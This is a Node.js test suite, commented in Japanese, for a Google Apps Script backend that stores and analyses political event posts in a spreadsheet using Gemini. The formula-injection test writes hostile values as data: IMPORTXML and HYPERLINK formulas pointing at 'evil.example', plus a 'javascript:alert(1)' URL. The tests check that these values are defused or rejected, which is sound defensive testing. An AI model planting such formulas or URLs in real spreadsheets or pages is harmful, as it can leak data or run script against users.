// ============================================================
// gas/Code.gs（＋ Config.gs）のテスト
//
//   GAS のサービス（SpreadsheetApp・UrlFetchApp など）をスタブに差し替えた
//   vm コンテキストで本物のコードを実行し、doPost の経路を検証する。
//   重点: 合言葉未設定時の拒否、数式インジェクション対策、保存・検索・重複警告、
//   本文取得（Slack・X・note）と Gemini・Jev の呼び出し。
//
//   注意（LESSONS）: vm 内で作られたオブジェクトは JSON 経由で同じレルムにしてから
//   deepStrictEqual で比べる。
// ============================================================

'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const TOKEN = 'test-token';
const CONFIG_SOURCE = fs.readFileSync(path.join(__dirname, '..', 'gas', 'Config.gs'), 'utf8');
const CODE_SOURCE = fs.readFileSync(path.join(__dirname, '..', 'gas', 'Code.gs'), 'utf8');

// ---- スタブ ---------------------------------------------------

/**
 * インメモリのシート。実際のスプレッドシートと同じく、
 * 先頭がアポストロフィの文字列は「アポストロフィを除いた文字列」として保存される。
 * 書き込まれた生の値は raw に残し、テストで数式インジェクション対策を確認できるようにする。
 */
function createSheetStub() {
  const values = [];
  const raw = [];
  const store = (v) => (typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
  const sheet = {
    values,
    raw,
    appendRow(row) {
      raw.push(row.slice());
      values.push(row.map(store));
    },
    deleteRow(n) {
      values.splice(n - 1, 1);
      raw.splice(n - 1, 1);
    },
    setFrozenRows() {},
    getLastRow() { return values.length; },
    getRange(row, col, numRows = 1, numCols = 1) {
      return {
        getValues() {
          const out = [];
          for (let r = 0; r < numRows; r++) {
            const line = [];
            for (let c = 0; c < numCols; c++) {
              const v = values[row - 1 + r] ? values[row - 1 + r][col - 1 + c] : undefined;
              line.push(v === undefined || v === null ? '' : v);
            }
            out.push(line);
          }
          return out;
        },
        setValues(rows) {
          rows.forEach((line, r) => {
            line.forEach((v, c) => {
              values[row - 1 + r][col - 1 + c] = store(v);
              raw[row - 1 + r][col - 1 + c] = v;
            });
          });
        }
      };
    }
  };
  return sheet;
}

/** UrlFetchApp のレスポンス相当 */
function res(code, body, headers = {}) {
  const text = typeof body === 'string' ? body : JSON.stringify(body);
  return {
    getResponseCode: () => code,
    getContentText: () => text,
    getHeaders: () => headers
  };
}

/** Gemini の generateContent 応答（JSON テキストを1パートで返す） */
function geminiRes(obj) {
  return res(200, { candidates: [{ content: { parts: [{ text: typeof obj === 'string' ? obj : JSON.stringify(obj) }] } }] });
}

/**
 * Config.gs と Code.gs を読み込んだ vm コンテキストを作る。
 *   props: スクリプトプロパティ（既定は合言葉と Gemini キーを設定済み）
 *   fetch: (url, params) => レスポンス（fetch と fetchAll の両方で使う）
 */
function load({ props, fetch } = {}) {
  const scriptProps = Object.assign({ SHARED_TOKEN: TOKEN, GEMINI_API_KEY: 'gemini-key' }, props || {});
  Object.keys(scriptProps).forEach((k) => { if (scriptProps[k] === undefined) { delete scriptProps[k]; } });
  const calls = [];
  const sheets = {};
  let uuid = 0;
  let clock = 0;
  const handler = fetch || (() => { throw new Error('想定外の通信'); });
  const context = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (name) => sheets[name] || null,
        insertSheet: (name) => { sheets[name] = createSheetStub(); return sheets[name]; }
      })
    },
    UrlFetchApp: {
      fetch(url, params) {
        calls.push(Object.assign({ url }, params || {}));
        return handler(url, params || {});
      },
      fetchAll(requests) {
        return requests.map((r) => {
          calls.push(r);
          return handler(r.url, r);
        });
      }
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (Object.prototype.hasOwnProperty.call(scriptProps, k) ? scriptProps[k] : null),
        setProperty: (k, v) => { scriptProps[k] = v; }
      })
    },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    Utilities: {
      getUuid: () => 'uuid-' + (++uuid),
      // 保存のたびに1秒進む固定の時計（日時の文字列が決定的になるように）
      formatDate: (date, tz, pattern) => {
        if (pattern === 'yyyy-MM-dd') { return '2026-10-02'; }
        clock++;
        return '2026-10-02 10:00:' + String(clock).padStart(2, '0');
      }
    },
    Logger: { log() {} },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (text) => {
        const out = { getContent: () => text, setMimeType: () => out };
        return out;
      }
    }
  };
  vm.createContext(context);
  vm.runInContext(CONFIG_SOURCE, context);
  vm.runInContext(CODE_SOURCE, context);
  return { context, calls, props: scriptProps, sheet: () => sheets['投稿一覧'] };
}

/** doPost を呼んで JSON を返す（合言葉は既定で正しいものを付ける） */
function post(env, body, token = TOKEN) {
  const payload = Object.assign({}, body);
  if (token !== null) { payload.token = token; }
  return JSON.parse(env.context.doPost({ postData: { contents: JSON.stringify(payload) } }).getContent());
}

/** 保存用の最小限の正しい入力 */
function validPost(overrides = {}) {
  return Object.assign({
    action: 'save', kind: 'article', source: 'slack', category: 'お知らせ',
    title: 'タイトル', summary: '概略', url: 'https://example.com/a', original: '原文',
    tags: [], eventIso: '', place: '', deadline: '', performers: '', memo: ''
  }, overrides);
}

// ---- 合言葉 -----------------------------------------------------

test('合言葉（SHARED_TOKEN）が未設定なら、すべての action を拒否し、通信もシート操作もしない', () => {
  const env = load({ props: { SHARED_TOKEN: undefined } });
  for (const action of ['bootstrap', 'analyze', 'summarize', 'save', 'update', 'delete', 'search', 'addTag']) {
    const r = post(env, { action, text: '本文', title: 'x' }, '');
    assert.strictEqual(r.ok, false, action);
    assert.match(r.error, /SHARED_TOKEN（合言葉）が未設定/, action);
  }
  // 空文字の合言葉を送っても素通しにならない
  assert.strictEqual(post(env, { action: 'bootstrap' }, '').ok, false);
  assert.strictEqual(env.calls.length, 0);
  assert.strictEqual(env.sheet(), undefined);
});

test('合言葉が空白だけの設定も未設定として扱う', () => {
  const env = load({ props: { SHARED_TOKEN: '   ' } });
  assert.match(post(env, { action: 'bootstrap' }, '   ').error, /未設定/);
});

test('合言葉が違う・無い・文字列でないときは拒否する', () => {
  const env = load();
  assert.match(post(env, { action: 'bootstrap' }, 'wrong').error, /合言葉が一致しません/);
  assert.match(post(env, { action: 'bootstrap' }, null).error, /合言葉が一致しません/);
  const r = JSON.parse(env.context.doPost({ postData: { contents: JSON.stringify({ action: 'bootstrap', token: ['test-token'] }) } }).getContent());
  assert.strictEqual(r.ok, false);
  assert.strictEqual(post(env, { action: 'bootstrap' }).ok, true);
});

test('doGet はデータを返さない／不正な JSON・不明な action はエラー', () => {
  const env = load();
  const r = JSON.parse(env.context.doGet({ parameter: { action: 'search', token: TOKEN } }).getContent());
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.items, undefined);
  assert.match(JSON.parse(env.context.doPost({ postData: { contents: '{' } }).getContent()).error, /JSON が不正/);
  assert.match(post(env, { action: 'unknown' }).error, /不明な action/);
});

test('bootstrap: 設定・カテゴリ・タグを返し、API キーそのものは返さない', () => {
  const env = load({ props: { TYPESAFE_API_KEY: 'jev-secret' } });
  const r = post(env, { action: 'bootstrap' });
  assert.strictEqual(r.ok, true);
  assert.deepStrictEqual(r.categories, ['イベント', '活動報告', 'お知らせ', '政策・記事', 'その他']);
  assert.strictEqual(r.geminiConfigured, true);
  assert.strictEqual(r.jevConfigured, true);
  assert.strictEqual(r.model, 'gemini-3.1-flash-lite');
  const text = JSON.stringify(r);
  assert.ok(!text.includes('gemini-key') && !text.includes('jev-secret') && !text.includes(TOKEN));
});

// ---- 保存と数式インジェクション対策 -----------------------------------

test('数式インジェクション対策: = + - @ で始まる値も、日付風の値も、文字列として書き込まれ元の値で読み戻せる', () => {
  const env = load();
  const dangerous = {
    title: '=IMPORTXML("https://evil.example/","//a")',
    summary: '+SUM(1,2)',
    original: '-1+2\n=HYPERLINK("https://evil.example")',
    memo: '@メンション',
    place: '2026-10-03',
    performers: '0120-000-000'
  };
  const r = post(env, validPost(dangerous));
  assert.strictEqual(r.ok, true, r.error);
  const rawRow = env.sheet().raw[1];
  rawRow.forEach((cell) => {
    if (cell !== '') { assert.strictEqual(cell.charAt(0), "'", '空でないセルはすべてアポストロフィ付き: ' + cell); }
  });
  const item = post(env, { action: 'search' }).items[0];
  for (const key of Object.keys(dangerous)) {
    assert.strictEqual(item[key], dangerous[key], key);
  }
});

test('save: 1行1件で、ヘッダーどおりの列に書き込む（種別・ソースは表示名）', () => {
  const env = load();
  const r = post(env, validPost({ kind: 'schedule', tags: [], eventIso: '2026-10-03T19:00+09:00', deadline: '2026-10-01', memo: 'メモ' }));
  assert.strictEqual(r.ok, true);
  const [header, row] = env.sheet().values;
  assert.deepStrictEqual(Array.from(header), [
    '登録日時', '種別', 'ソース', 'カテゴリ', 'タイトル', '概略', 'URL',
    'スレッド詳細（原文）', 'タグ', '開催日時（ISO）', '場所', '申込締切', '出演者', 'メモ', 'ID'
  ]);
  assert.strictEqual(row[1], 'スケジュール');
  assert.strictEqual(row[2], 'Slack');
  assert.strictEqual(row[9], '2026-10-03T19:00+09:00');
  assert.strictEqual(row[11], '2026-10-01');
  assert.strictEqual(row[14], r.id);
});

test('save: 入力の検証（タイトル・種別・カテゴリ・タグ・日時の形式・存在しない日付）', () => {
  const env = load();
  assert.match(post(env, validPost({ title: '  ' })).error, /タイトル/);
  assert.match(post(env, validPost({ kind: 'xxx' })).error, /種別/);
  assert.match(post(env, validPost({ source: 'xxx' })).error, /入力元/);
  assert.match(post(env, validPost({ category: '未登録' })).error, /カテゴリ/);
  assert.match(post(env, validPost({ tags: ['未登録タグ'] })).error, /不明なタグ/);
  assert.match(post(env, validPost({ url: 'javascript:alert(1)' })).error, /URL/);
  assert.match(post(env, validPost({ eventIso: '2026/10/03' })).error, /開催日時の形式/);
  assert.match(post(env, validPost({ eventIso: '2026-02-30' })).error, /存在しない日付/);
  assert.match(post(env, validPost({ deadline: '2026-13-01' })).error, /申込締切/);
  assert.match(post(env, validPost({ original: 'あ'.repeat(50000) })).error, /長すぎます/);
  assert.strictEqual(post(env, validPost({ original: 'あ'.repeat(49999) })).ok, true);
});

test('save: 議員名一覧にある名前はタグとして保存できる', () => {
  const env = load();
  vm.runInContext("APP_CONFIG.legislators = ['山田太郎']", env.context);
  assert.strictEqual(post(env, validPost({ tags: ['山田太郎'] })).ok, true);
});

test('save: 同じ URL は警告して止め、force=true なら保存する（twitter.com と x.com、追跡パラメーターの違いも同じとみなす）', () => {
  const env = load();
  assert.strictEqual(post(env, validPost({ url: 'https://x.com/user/status/123' })).ok, true);
  const dup = post(env, validPost({ url: 'https://twitter.com/user/status/123/?s=20&utm_source=line' }));
  assert.strictEqual(dup.ok, false);
  assert.strictEqual(dup.duplicate.title, 'タイトル');
  assert.match(dup.error, /同じ URL/);
  assert.strictEqual(env.sheet().values.length, 2);
  assert.strictEqual(post(env, validPost({ url: 'https://twitter.com/user/status/123', force: true })).ok, true);
  assert.strictEqual(env.sheet().values.length, 3);
  // URL が空の投稿どうしは重複扱いしない
  assert.strictEqual(post(env, validPost({ url: '' })).ok, true);
  assert.strictEqual(post(env, validPost({ url: '' })).ok, true);
});

test('normalizeUrlForCompare_: 正規化の規則', () => {
  const { context } = load();
  const n = context.normalizeUrlForCompare_;
  assert.strictEqual(n('https://WWW.Example.com/a/?utm_source=x&b=2&a=1#top'), 'example.com/a?a=1&b=2');
  assert.strictEqual(n('http://example.com/a'), n('https://example.com/a/'));
  assert.notStrictEqual(n('https://example.com/a?id=1'), n('https://example.com/a?id=2'));
  assert.strictEqual(n(''), '');
  assert.strictEqual(n('not a url'), '');
});

// ---- 編集・削除・検索 --------------------------------------------

test('update: 登録日時と ID は変えずに内容を書き換える／delete: 行を消す', () => {
  const env = load();
  const saved = post(env, validPost());
  const before = env.sheet().values[1].slice();
  const r = post(env, validPost({ action: 'update', id: saved.id, title: '新タイトル', memo: '=1+1' }));
  assert.strictEqual(r.ok, true, r.error);
  const after = env.sheet().values[1];
  assert.strictEqual(after[0], before[0]);
  assert.strictEqual(after[4], '新タイトル');
  assert.strictEqual(after[13], '=1+1');
  assert.strictEqual(env.sheet().raw[1][13], "'=1+1");
  assert.strictEqual(after[14], saved.id);
  assert.match(post(env, validPost({ action: 'update', id: 'none' })).error, /見つかりません/);
  assert.strictEqual(post(env, { action: 'delete', id: saved.id }).ok, true);
  assert.strictEqual(env.sheet().values.length, 1);
  assert.match(post(env, { action: 'delete', id: saved.id }).error, /見つかりません/);
});

test('update: 自分自身の URL は重複扱いしないが、ほかの投稿と同じ URL にすると警告する', () => {
  const env = load();
  const a = post(env, validPost({ url: 'https://example.com/a' }));
  post(env, validPost({ url: 'https://example.com/b' }));
  assert.strictEqual(post(env, validPost({ action: 'update', id: a.id, url: 'https://example.com/a' })).ok, true);
  assert.strictEqual(post(env, validPost({ action: 'update', id: a.id, url: 'https://example.com/b' })).ok, false);
});

test('右側に列を追加しても、読み取り・編集は壊れず追加列の値も残る', () => {
  const env = load();
  const saved = post(env, validPost());
  env.sheet().values[0].push('投稿済み');
  env.sheet().values[1].push('TRUE');
  assert.strictEqual(post(env, { action: 'search' }).items[0].id, saved.id);
  assert.strictEqual(post(env, validPost({ action: 'update', id: saved.id, title: '更新' })).ok, true);
  assert.strictEqual(env.sheet().values[1][15], 'TRUE');
});

test('search: 新しい順・キーワードは原文も対象・カテゴリ/種別/タグ(AND)で絞り込み・50件ずつ', () => {
  const env = load();
  post(env, { action: 'addTag', name: '街頭' });
  post(env, { action: 'addTag', name: '神戸' });
  post(env, validPost({ title: '古い', url: '', original: '原文にだけある語ABC', tags: ['街頭'] }));
  post(env, validPost({ title: '新しい', url: '', category: 'イベント', kind: 'schedule', tags: ['街頭', '神戸'] }));
  assert.deepStrictEqual(post(env, { action: 'search' }).items.map((i) => i.title), ['新しい', '古い']);
  assert.deepStrictEqual(post(env, { action: 'search', keyword: 'abc' }).items.map((i) => i.title), ['古い']);
  assert.deepStrictEqual(post(env, { action: 'search', category: 'イベント' }).items.map((i) => i.title), ['新しい']);
  assert.deepStrictEqual(post(env, { action: 'search', kind: 'article' }).items.map((i) => i.title), ['古い']);
  assert.deepStrictEqual(post(env, { action: 'search', tags: ['街頭', '神戸'] }).items.map((i) => i.title), ['新しい']);
  for (let i = 0; i < 55; i++) { post(env, validPost({ url: '', title: 'n' + i })); }
  const page1 = post(env, { action: 'search' });
  assert.strictEqual(page1.items.length, 50);
  assert.strictEqual(page1.hasMore, true);
  const page2 = post(env, { action: 'search', offset: 50 });
  assert.strictEqual(page2.items.length, 7);
  assert.strictEqual(page2.hasMore, false);
});

// ---- カテゴリ・タグ管理 ----------------------------------------------

test('カテゴリ・タグ: 追加・重複拒否・削除・並べ替え（集合が違えば拒否）・最後のカテゴリは消せない', () => {
  const env = load();
  assert.deepStrictEqual(post(env, { action: 'addTag', name: 'a,b' }).tags, ['a、b']);
  assert.match(post(env, { action: 'addTag', name: 'a,b' }).error, /すでにあります/);
  assert.deepStrictEqual(post(env, { action: 'addTag', name: 'c' }).tags, ['a、b', 'c']);
  assert.deepStrictEqual(post(env, { action: 'reorderTags', tags: ['c', 'a、b'] }).tags, ['c', 'a、b']);
  assert.match(post(env, { action: 'reorderTags', tags: ['c'] }).error, /一致しません/);
  assert.deepStrictEqual(post(env, { action: 'removeTag', name: 'c' }).tags, ['a、b']);
  const cats = post(env, { action: 'bootstrap' }).categories;
  cats.slice(1).forEach((name) => post(env, { action: 'removeCategory', name }));
  assert.match(post(env, { action: 'removeCategory', name: cats[0] }).error, /1つ以上必要/);
});

// ---- analyze ------------------------------------------------------

/** analyze の Gemini 応答のひな形 */
function geminiAnalyze(overrides = {}) {
  return Object.assign({
    title: '街頭演説', summary: '1行目\n2行目\n3行目\n4行目', kind: 'schedule',
    eventDate: '2026-10-03', startTime: '19:00', endTime: '', place: '神戸駅前', deadline: '',
    performers: '山田太郎', imageText: '', flyerWeekday: '', category: 'イベント', tags: []
  }, overrides);
}

test('analyze: Slack の URL だけなら、通信せず（Gemini も呼ばず）貼り付けを促す', () => {
  const env = load();
  const r = post(env, { action: 'analyze', url: 'https://team.slack.com/archives/C1/p123' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.fetchStatus, 'needs_paste');
  assert.strictEqual(r.source, 'slack');
  assert.strictEqual(r.analyzed, false);
  assert.match(r.warnings[0], /Slack/);
  assert.strictEqual(env.calls.length, 0);
});

test('analyze: 本文を Gemini に渡し、結果を検証して返す（不正な日付・未登録カテゴリは空にする）', () => {
  const env = load({
    fetch: () => geminiRes(geminiAnalyze({ deadline: '2026-02-30', category: '存在しない', endTime: '25:00', flyerWeekday: '(土)' }))
  });
  vm.runInContext("APP_CONFIG.legislators = ['山田太郎', '佐藤花子']", env.context);
  const text = '10月3日19時から神戸駅前で山田太郎が街頭演説します。';
  const r = post(env, { action: 'analyze', source: 'slack', text });
  assert.strictEqual(r.ok, true, r.error);
  assert.strictEqual(r.analyzed, true);
  assert.strictEqual(r.originalText, text);
  assert.strictEqual(r.title, '街頭演説');
  assert.strictEqual(r.kind, 'schedule');
  assert.strictEqual(r.event.date, '2026-10-03');
  assert.strictEqual(r.event.deadline, '');
  assert.strictEqual(r.event.endTime, '');
  assert.strictEqual(r.flyerWeekday, '土');
  assert.strictEqual(r.category, '');
  assert.deepStrictEqual(r.legislatorTags, ['山田太郎']);

  const call = env.calls[0];
  assert.match(call.url, /models\/gemini-3\.1-flash-lite:generateContent$/);
  assert.strictEqual(call.headers['x-goog-api-key'], 'gemini-key');
  const payload = JSON.parse(call.payload);
  assert.strictEqual(payload.generationConfig.responseMimeType, 'application/json');
  assert.ok(payload.generationConfig.responseSchema.properties.kind, 'Jev が無いときは Gemini が分類する');
  assert.ok(payload.contents[0].parts[0].text.includes(text));
  assert.ok(payload.systemInstruction.parts[0].text.includes('2026-10-02'), '今日の日付を渡して絶対日付にさせる');
});

test('analyze: LLM に渡す本文は設定の文字数で切り、原文は切らずに返す', () => {
  const env = load({ fetch: () => geminiRes(geminiAnalyze()) });
  const text = 'あ'.repeat(7000);
  const r = post(env, { action: 'analyze', source: 'other', text });
  assert.strictEqual(r.originalText.length, 7000);
  const sent = JSON.parse(env.calls[0].payload).contents[0].parts[0].text;
  assert.ok(sent.includes('あ'.repeat(6000)) && !sent.includes('あ'.repeat(6001)));
});

test('analyze: GEMINI_MODEL を設定すればそのモデルを使う／キーが無ければエラー', () => {
  const env = load({ props: { GEMINI_MODEL: 'gemini-3.5-flash-lite' }, fetch: () => geminiRes(geminiAnalyze()) });
  post(env, { action: 'analyze', text: '本文' });
  assert.match(env.calls[0].url, /gemini-3\.5-flash-lite:generateContent/);
  const noKey = load({ props: { GEMINI_API_KEY: undefined } });
  assert.match(post(noKey, { action: 'analyze', text: '本文' }).error, /GEMINI_API_KEY/);
});

test('analyze: Gemini の HTTP エラー・ブロック・壊れた JSON は日本語のエラーにする', () => {
  assert.match(post(load({ fetch: () => res(429, 'quota') }), { action: 'analyze', text: '本文' }).error, /Gemini API エラー（HTTP 429）/);
  assert.match(post(load({ fetch: () => res(200, { promptFeedback: { blockReason: 'SAFETY' } }) }), { action: 'analyze', text: '本文' }).error, /SAFETY/);
  assert.match(post(load({ fetch: () => geminiRes('{壊れた') }), { action: 'analyze', text: '本文' }).error, /JSON として読めません/);
});

test('analyze: 思考パート（thought）は結果に混ぜない', () => {
  const env = load({
    fetch: () => res(200, { candidates: [{ content: { parts: [{ text: '考え中', thought: true }, { text: JSON.stringify(geminiAnalyze()) }] } }] })
  });
  assert.strictEqual(post(env, { action: 'analyze', text: '本文' }).title, '街頭演説');
});

test('analyze: Jev のキーがあれば Gemini と並列（fetchAll）で呼び、種別・カテゴリ・タグは Jev の結果を使う', () => {
  const env = load({
    props: { TYPESAFE_API_KEY: 'jev-key' },
    fetch: (url) => {
      if (url.includes('typesafe')) {
        return res(200, { answers: {
          kind: { type: 'choice', choice: 'c1' },
          category: { type: 'choice', choice: 'c3' },
          tag_0: { type: 'noul', noul: 0.9 },
          tag_1: { type: 'noul', noul: 0.2 }
        } });
      }
      return geminiRes(geminiAnalyze({ kind: undefined, category: undefined }));
    }
  });
  post(env, { action: 'addTag', name: '政策' });
  post(env, { action: 'addTag', name: '街頭' });
  env.calls.length = 0;
  const r = post(env, { action: 'analyze', text: '本文'.repeat(5000) });
  assert.strictEqual(env.calls.length, 2);
  const geminiPayload = JSON.parse(env.calls[0].payload);
  assert.strictEqual(geminiPayload.generationConfig.responseSchema.properties.kind, undefined, 'Jev があれば Gemini に分類させない');
  const jevPayload = JSON.parse(env.calls[1].payload);
  assert.strictEqual(env.calls[1].headers.Authorization, 'Bearer jev-key');
  assert.strictEqual(jevPayload.state.text.length, 8000, 'Jev に渡す本文は設定の文字数で切る');
  assert.strictEqual(r.kind, 'article');
  assert.strictEqual(r.category, '政策・記事');
  assert.deepStrictEqual(r.tags, ['政策']);
});

test('analyze: Jev が失敗しても全体は失敗にせず、警告を返す', () => {
  const env = load({
    props: { TYPESAFE_API_KEY: 'jev-key' },
    fetch: (url) => (url.includes('typesafe') ? res(500, 'error') : geminiRes(geminiAnalyze()))
  });
  const r = post(env, { action: 'analyze', text: '本文' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.kind, '');
  assert.ok(r.warnings.some((w) => /Jev/.test(w)));
});

test('analyze: X の URL は oEmbed で本文と投稿者名を取り、末尾が「…」なら途中切れを警告する', () => {
  const oembed = (text) => res(200, {
    author_name: '山田太郎',
    html: '<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">' + text + '</p>&mdash; 山田太郎 (@yamada) <a href="https://x.com/yamada/status/1">2026</a></blockquote>'
  });
  const env = load({
    fetch: (url) => {
      if (url.startsWith('https://publish.twitter.com/')) { return oembed('明日は&amp;街頭演説<br>よろしく&#x1F600;'); }
      if (url.startsWith('https://x.com/')) { return res(200, ''); }
      return geminiRes(geminiAnalyze());
    }
  });
  const r = post(env, { action: 'analyze', url: 'https://x.com/yamada/status/1' });
  assert.strictEqual(r.source, 'x');
  assert.strictEqual(r.author, '山田太郎');
  assert.strictEqual(r.originalText, '明日は&街頭演説\nよろしく😀');
  assert.strictEqual(r.fetchStatus, 'ok');

  const cut = load({
    fetch: (url) => (url.startsWith('https://publish.twitter.com/') ? oembed('長い投稿の途中まで…') : (url.startsWith('https://x.com/') ? res(200, '') : geminiRes(geminiAnalyze())))
  });
  const r2 = post(cut, { action: 'analyze', url: 'https://x.com/a/status/2' });
  assert.ok(r2.warnings.some((w) => /途中で切れて/.test(w)));
});

test('analyze: 共有された本文のほうが長ければ、取得した本文より優先する（X の全文貼り付け）', () => {
  const env = load({
    fetch: (url) => {
      if (url.startsWith('https://publish.twitter.com/')) { return res(200, { author_name: 'A', html: '<p>短い…</p>' }); }
      if (url.startsWith('https://x.com/')) { return res(200, ''); }
      return geminiRes(geminiAnalyze());
    }
  });
  const pasted = '貼り付けた全文です。'.repeat(10);
  assert.strictEqual(post(env, { action: 'analyze', url: 'https://x.com/a/status/1', text: pasted }).originalText, pasted);
});

test('analyze: note の記事は記事 API から本文と著者名を取る', () => {
  const body = '<p name="a">noteの本文1段落目です。十分な長さの文章をここに書いています。</p><p name="b">2段落目<br>改行あり</p>';
  const env = load({
    fetch: (url) => {
      if (url === 'https://note.com/api/v3/notes/nabc123') {
        return res(200, { data: { name: '記事名', body, user: { nickname: '佐藤' } } });
      }
      if (url.startsWith('https://note.com/')) { return res(200, ''); }
      return geminiRes(geminiAnalyze());
    }
  });
  const r = post(env, { action: 'analyze', url: 'https://note.com/sato/n/nabc123' });
  assert.strictEqual(r.source, 'note');
  assert.strictEqual(r.author, '佐藤');
  assert.strictEqual(r.originalText, 'noteの本文1段落目です。十分な長さの文章をここに書いています。\n2段落目\n改行あり');
});

test('analyze: 本文が取れない一般ページは貼り付けを促し、Gemini は呼ばない', () => {
  const env = load({ fetch: () => res(200, '<html><head><title>T</title></head><body><script>x</script>短い</body></html>') });
  const r = post(env, { action: 'analyze', url: 'https://example.com/page' });
  assert.strictEqual(r.fetchStatus, 'needs_paste');
  assert.strictEqual(r.title, 'T');
  assert.ok(env.calls.every((c) => !c.url.includes('generativelanguage')));
});

test('analyze: 短縮 URL はリダイレクトを辿ってから重複チェックする', () => {
  const env = load({
    fetch: (url, params) => {
      if (url === 'https://short.example/x' && params.followRedirects === false) { return res(301, '', { Location: 'https://example.com/a' }); }
      if (url === 'https://example.com/a' && params.followRedirects === false) { return res(200, ''); }
      if (url === 'https://example.com/a') { return res(200, '<article>' + '本文です。'.repeat(20) + '</article>'); }
      return geminiRes(geminiAnalyze());
    }
  });
  post(env, validPost({ url: 'https://example.com/a' }));
  const r = post(env, { action: 'analyze', url: 'https://short.example/x' });
  assert.strictEqual(r.resolvedUrl, 'https://example.com/a');
  assert.ok(r.duplicate && r.duplicate.title === 'タイトル');
});

test('analyze: 画像だけの告知は画像を Gemini に渡し、読み取った文章をスレッド用の原文にする', () => {
  const env = load({ fetch: () => geminiRes(geminiAnalyze({ imageText: 'チラシの文字\n10/3(土) 19:00' })) });
  const r = post(env, { action: 'analyze', image: { mimeType: 'image/jpeg', data: 'QUJD' } });
  assert.strictEqual(r.source, 'flyer');
  assert.strictEqual(r.originalText, 'チラシの文字\n10/3(土) 19:00');
  assert.strictEqual(r.originalFromImage, true);
  const parts = JSON.parse(env.calls[0].payload).contents[0].parts;
  assert.deepStrictEqual(parts[1], { inlineData: { mimeType: 'image/jpeg', data: 'QUJD' } });
});

test('analyze: 入力の検証（何もない・不正な URL・未対応の画像形式・大きすぎる画像）', () => {
  const env = load();
  assert.match(post(env, { action: 'analyze' }).error, /どれかを入力/);
  assert.match(post(env, { action: 'analyze', url: 'ftp://x' }).error, /URL の形式/);
  assert.match(post(env, { action: 'analyze', image: { mimeType: 'image/gif', data: 'x' } }).error, /画像形式/);
  assert.match(post(env, { action: 'analyze', image: { mimeType: 'image/png', data: 'x'.repeat(8000001) } }).error, /大きすぎ/);
  assert.match(post(env, { action: 'analyze', text: 'a', source: 'zzz' }).error, /不明な入力元/);
});

// ---- summarize ----------------------------------------------------

test('summarize: 長さの指定を検証し、要約の本文だけを返す', () => {
  const env = load({ fetch: () => geminiRes('要約した文章\n') });
  const r = post(env, { action: 'summarize', text: '原文', length: '3lines' });
  assert.strictEqual(r.summary, '要約した文章');
  const payload = JSON.parse(env.calls[0].payload);
  assert.match(payload.systemInstruction.parts[0].text, /3行程度/);
  assert.match(payload.systemInstruction.parts[0].text, /URL・日付・時刻・数字/);
  assert.match(post(env, { action: 'summarize', text: '原文', length: '10行' }).error, /長さの指定/);
  assert.match(post(env, { action: 'summarize', text: '  ' }).error, /本文がありません/);
});

// ---- 純粋関数 -------------------------------------------------------

test('htmlToText_ / decodeEntities_ / truncateText_', () => {
  const { context } = load();
  assert.strictEqual(context.htmlToText_('<p>a&amp;b</p><p>c<br/>d</p><ul><li>x</li><li>y</li></ul>'), 'a&b\nc\nd\n・x\n・y');
  assert.strictEqual(context.decodeEntities_('&#128512;&#x1F600;&amp;lt;'), '😀😀&lt;');
  assert.strictEqual(context.truncateText_('ab😀', 3), 'ab');
  assert.strictEqual(context.truncateText_('abc', 10), 'abc');
});

test('同じ名前の関数が二重に定義されていない（書き換え時の消し忘れ防止）', () => {
  const names = (CODE_SOURCE.match(/^function\s+(\w+)/gm) || []).map((s) => s.replace(/^function\s+/, ''));
  const dup = names.filter((n, i) => names.indexOf(n) !== i);
  assert.deepStrictEqual(dup, []);
});
